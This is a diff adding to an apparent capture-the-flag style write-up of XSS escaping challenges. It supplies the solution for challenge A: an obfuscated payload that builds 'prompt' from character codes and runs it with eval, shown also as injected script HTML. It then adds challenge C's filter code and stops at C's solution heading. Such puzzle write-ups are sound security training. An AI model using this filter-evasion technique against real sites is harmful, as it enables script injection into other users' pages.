@@ -8,6 +8,7 @@
 - [2](#2)
 - [7](#7)
 - [A](#a)
+- [C](#c)
 
 ## 0
 
@@ -130,6 +131,34 @@ function escape(input) {
     // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
     return '<script>' + input + '</script> ';
 }   
+```
+
+- Solution
+
+```
+eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116)))))))(1)
+```
+
+- HTML source
+
+```
+<script>eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116)))))))(1)</script>
+```
+
+### C
+
+- Task
+
+```
+function escape(input) {
+    // in Soviet Russia...
+    input = encodeURIComponent(input).replace(/'/g, '');
+    // table flips you!
+    input = input.replace(/prompt/g, 'alert');
+
+    // ノ┬─┬ノ ︵ ( \o°o)\
+    return '<script>' + input + '</script> ';
+}
 ```
 
 - Solution
